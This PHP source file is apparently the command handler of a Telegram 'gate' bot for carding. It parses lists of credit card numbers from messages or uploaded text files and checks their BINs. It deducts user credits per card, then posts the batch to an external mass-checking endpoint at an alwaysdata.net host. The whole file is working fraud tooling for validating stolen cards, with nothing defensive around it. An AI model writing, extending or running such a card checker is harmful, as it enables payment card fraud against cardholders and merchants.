<?php 

use App\Gate\{Bin, Card, CurlX};
use App\Models\{Bot, User};

$query = Bot::GetContent($message, strlen($cmd['cmd']) + 2);

$txt = $up['message']['reply_to_message']['text'] ?? $message;

// Get content from txt
if (isset($up['message']['reply_to_message']['document']) && $up['message']['reply_to_message']['document']['mime_type'] == 'text/plain') {
    $file_id = $up['message']['reply_to_message']['document']['file_id'];
    // File ID
    $file = Bot::getfile(['file_id' => $file_id]);
    if (!$file['ok']) {Bot::SendMsg($chat_id, '<b>Error:</b> <i>' . $file['description'] . '</i>', $message_id);exit;}

    // File url path
    $file_path = 'https://api.telegram.org/file/bot' . Bot::GetToken() . '/' . $file['result']['file_path'];

    /** @var string CCs content */
    $txt = file_get_contents($file_path);
}

// Comment
$spam = "<b>λ Gate " . $cmd['name'] . "\nFormat:</b> <code>" . $t . $cmd['cmd'] . ' ' . $cmd['form'] . "</code>";
$spam .= (strlen($cmd['msg']) < 5) ? '' : "\n\n<b>📝Comment:</b> <i>" . $cmd['msg'] . "</i>";

// Get cards
$cc = Card::SetCard($txt);

// Not foun cards
if (!$cc['ok']) {
    Bot::SendMsg($chat_id, $spam, $message_id);
    exit;
}

// Cards invalid
if ($cc['data']['all'] == $cc['data']['invalid']) {
    Bot::SendMsg($chat_id, "<b><i>All cards are invalid</i></b>", $message_id);
    exit;
}

/** @var string Spam Invalid */
$invalid = '<b>⚠️ <i>Bad cards</i> ('.$cc['data']['invalid']."):</b>\n";
/** @var string Spam Valid */
$valid   = '<b>✅ <i>Valid card</i> ('.$cc['data']['valid']."):</b>\n";
/** @var array Payload POST */
$payload = [];

// Iterar en las cc invalidas
foreach ($cc['cc']['invalid'] as $item) {
    $invalid .= '<b>- <i>' . $item['reason']['msg'] . '</i></b> (<code>'.$item['cc'][0]."</code>)\n";
}
// Iterar en las cc validas
foreach ($cc['cc']['valid'] as $item) {
    /** @var arraystring Bin info */
    $bin = Bin::Get($item['cc'][0]);
    // Invalid bin
    if (!$bin['ok']) {
        $invalid .= '⚠️' . $bin['error'] .' (<code>'.$item['cc'][0]."</code>)\n";
    } else {
        // Valid bin and add to payload
        $payload['ccs'][] = ['cc' => $item['cc'], 'bin' => $bin];
        $valid .= '<code>' . implode('|', $item['cc']) . "</code>\n";
    }
}
$invalid .= "\n";

if (count($payload['ccs']) > $f['creditos']) {
    Bot::SendMsg($chat_id, 'Insufficient credits, you need at least ' . count($payload['ccs'])+1 . ' credits', $message_id);
    exit;
}
// Send spam invalid from invalid bin
if (count($payload['ccs']) < 1) {
    Bot::SendMsg($chat_id, "<b><i>All cards are invalid</i></b>", $message_id);
    exit;   
}

$f['ida'] = Bot::SendMsg($chat_id, $invalid.$valid, $message_id)['result']['message_id'];

// Construct payload
$f['chat_id'] = $chat_id;
$f['msg_id'] = $message_id;
$payload['user'] = $f;
$payload['gate']  = $cmd;

$post = json_encode($payload);
Bot::SendMsg($chat_id, htmlentities($post));
$a = CurlX::Post('https://arronbyrd75.alwaysdata.net/kirari/public/gates/?'.http_build_query(['path' => './mass/init.php']), $post);
print_r($a);